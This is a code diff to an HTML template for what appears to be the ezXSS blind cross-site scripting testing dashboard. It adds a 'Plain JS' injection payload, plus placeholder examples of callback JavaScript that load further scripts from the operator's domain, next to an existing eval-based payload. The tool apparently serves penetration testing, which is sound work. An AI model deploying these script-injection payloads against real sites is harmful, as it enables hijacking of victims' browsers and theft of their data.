@@ -32,7 +32,6 @@
                 </div>
 
                 <div class="col-lg-6">
-
                     <div class="panel panel-filled">
                         <div class="panel-heading">Payloads <a href="//{%data domain}/assets/payload-tester.html" target=_blank style="float:right">↗ tester</a></div>
                         <div class="panel-body payload-panel">
@@ -84,7 +83,11 @@
 
                                 <label class="control-label">Create Element</label>
                                 <input class="form-control scriptsrc"
-                                    value="javascript:eval(&apos;var a=document.createElement(\&apos;script\&apos;);a.src=\&apos;//{%data domain}\&apos;;document.body.appendChild(a)&apos;)">
+                                    value="javascript:eval(&apos;var a=document.createElement(\&apos;script\&apos;);a.src=\&apos;//{%data domain}\&apos;;document.body.appendChild(a)&apos;)"><br>
+
+                                <label class="control-label">Plain JS</label>
+                                <input class="form-control scriptsrc"
+                                    value="document.head.appendChild(Object.assign(document.createElement('script'),{src:'//{%data domain}'}));">
                             </div>
                         </div>
                     </div>
@@ -177,23 +180,26 @@
                                 <div class="form-group">
                                     <label class="control-label" for="customjs">Custom javascript pre-callback</label>
                                     <textarea class="form-control" id="customjs" name="customjs"
+                                    placeholder="// Do things or edit values before the callback is send
+ez_rD.dom = 'new value'; // ez_rD holds the data"
                                         rows=4>{%data customjs}</textarea>
                                 </div>
 
                                 <div class="form-group">
                                     <label class="control-label" for="customjs2">Custom javascript post-callback</label>
                                     <textarea class="form-control" id="customjs2" name="customjs2"
+                                    placeholder="var somedata = {payload: '//{%data domain}/', 'uri': 'https://ezxss.com'};
+ez_cb(somedata, null); // Create another callback
+
+document.head.appendChild(Object.assign(document.createElement('script'),{src:'//{%data domain}/custom'})); // Load another custom payload"
                                         rows=4>{%data customjs2}</textarea>
                                 </div>
-
-
 
                                 <button name="settings" type="submit" class="btn">Save</button>
                             </form>
                         </div>
                     </div>
                 </div>
-
             </div>
 
             <div class="row">
@@ -298,7 +304,6 @@
                     </div>
                 </div>
             </div>
-
         </div>
     </section>
 </div>
